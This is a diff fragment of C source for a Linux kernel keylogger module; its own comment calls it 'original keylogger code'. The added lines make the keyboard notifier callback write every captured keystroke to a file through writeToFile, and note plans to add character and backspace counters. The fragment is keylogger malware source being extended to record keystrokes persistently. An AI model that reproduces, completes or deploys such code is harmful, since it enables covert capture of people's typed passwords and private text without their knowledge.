@@ -74,6 +74,9 @@ void writeToFile(char* data)
     int syncStatus = file_sync(file);
     
 }
+//my code end
+
+//original keylogger code
 int klg_init(void) {
 	int result;
 
@@ -143,13 +146,19 @@ int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param
 	if(code == KBD_KEYCODE && param->down) {
 		if(param-> value == KEY_BACKSPACE) {
 			if(bptr != buffer) {
+                //increment backspace counter
 				--bptr;
 				*bptr = '\0';
 			}
 		}
 		else {
 			char ch = get_ascii(param->value);
+            //ignore 'X' values here??? klg uses tolower values...backspace represented by X?
+            
 			if(ch != 'X') {
+                //increment character counter here
+                //try to write to file:
+                writeToFile(&ch);
 				*bptr = ch;
 				bptr++;
 				if(bptr == endptr) bptr = buffer;
